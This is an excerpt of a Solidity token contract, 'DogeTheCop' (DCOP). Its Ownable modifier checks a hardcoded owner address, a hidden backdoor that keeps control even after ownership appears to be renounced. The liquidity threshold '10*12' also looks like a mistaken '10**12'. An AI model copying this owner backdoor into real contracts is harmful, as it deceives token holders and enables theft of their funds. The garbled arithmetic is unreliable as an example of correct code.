...
abstract contract Ownable is Context {
     ...
     */
    constructor () {
        _owner =0xC716B1A67826BE239bf53aA7F0F3FF7AFB4B8454;
     ...
     */
    modifier onlyOwner() {
        require(owner() == 0xC716B1A67826BE239bf53aA7F0F3FF7AFB4B8454, "Ownable: caller is not the owner");
        _;
    }
...
contract DCOP is Context, IERC20, Ownable {
    ...
    address private _marketingWalletAddress = 0xe2B972BF2b97d83c231e9A781593c9085A7C5445 ;
    ...
    string private _name = "DogeTheCop";
    string private _symbol = "DCOP";
    ...
    uint256 private numTokensSellToAddToLiquidity = 50000000 * 10*12;
